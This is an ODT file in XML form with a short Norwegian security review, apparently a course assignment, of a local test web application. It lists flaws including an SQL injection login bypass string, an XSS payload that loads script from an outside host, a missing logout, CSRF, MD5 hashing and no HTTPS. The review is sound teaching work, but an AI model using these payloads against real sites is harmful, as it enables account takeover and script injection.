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192c14" officeooo:paragraph-rsid="00192c14" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="0019e38b" officeooo:paragraph-rsid="0019e38b" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="001badf6" officeooo:paragraph-rsid="001badf6" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="001ca903" officeooo:paragraph-rsid="001ca903" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="001e94c0" officeooo:paragraph-rsid="001e94c0" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="002090ec" officeooo:paragraph-rsid="002090ec" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="002170c8" officeooo:paragraph-rsid="002170c8" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="00235e5e" officeooo:paragraph-rsid="00235e5e" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="0025fa33" officeooo:paragraph-rsid="0025fa33" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="00263e0a" officeooo:paragraph-rsid="00263e0a" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="002706c6" officeooo:paragraph-rsid="002706c6" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="0019e38b"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name="Arial" fo:font-size="10pt" officeooo:rsid="0019e38b" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="001dd1f8"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00249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injection: Det mest åpenbare. Hvis brukerkontoen admin eksisterer, skriv i brukernavn-feltet:</text:p>
      <text:p text:style-name="P1">admin' OR '1'='1</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">URL-felt: URL for søk er</text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T1">http://localhost:8080/Obl2TheApplication/dosearch?user</text:span><text:span text:style-name="T1">=&lt;brukernavn&gt;&amp;searchkey=&lt;søk&gt;</text:span></text:p>
      <text:p text:style-name="P2">Det er ingen sjekk på at oppgitt brukernavn er det brukeren er logget inn som, og søket registreres på brukernavnet i URLen.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Utlogging: Brukeren blir ikke logget ut.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Cookie: Rot-URLen til ordbokfilene lagres i en cookie. <text:span text:style-name="T2">Denne URLen leses og kontaktes av serveren, og kan derfor brukes til å utføre et DDOS-angrep med serveren som en bot i et botnett.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">GET-parametre: Søkeparametre sendes i URLen, inkludert brukernavnet (se over). Utover feilen med at brukernavnet kan redigeres, er ikke noe av dette sensitiv informasjon, så dette er ikke nødvendigvis feil.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P6">HTTPS: Brukes ikke.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7">Kryptering: Passord hashes med MD5, som er en brutt algoritme.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P8"><text:span text:style-name="T3">Registrering</text:span>: Registrering av bruker krever ikke <text:span text:style-name="T3">at noen av feltene er fylt inn, inkludert brukernavn.</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9">XSS: Et fremmed Javascript kan inkluderes ved å bruke som søketerm. Eksempel:</text:p>
      <text:p text:style-name="P9">&lt;script src="//pepperkake.net/h/s.js"&gt;&lt;/script&gt;</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P10">Databasestruktur: Ingen feilmeldinger gir informasjon om strukturen til databasen.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11">CSRF: Ingen kontroll på at brukeren mente å sende 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42:41.499000000</meta:creation-date>
    <meta:generator>LibreOffice/4.3.5.2$Windows_x86 LibreOffice_project/3a87456aaa6a95c63eea1c1b3201acedf0751bd5</meta:generator>
    <dc:date>2016-11-03T17:51:29.883000000</dc:date>
    <meta:editing-duration>PT2H6M26S</meta:editing-duration>
    <meta:editing-cycles>12</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="15" meta:word-count="171" meta:character-count="1219" meta:non-whitespace-character-count="1063"/>
  </office:meta>
</office:document-meta>
</file>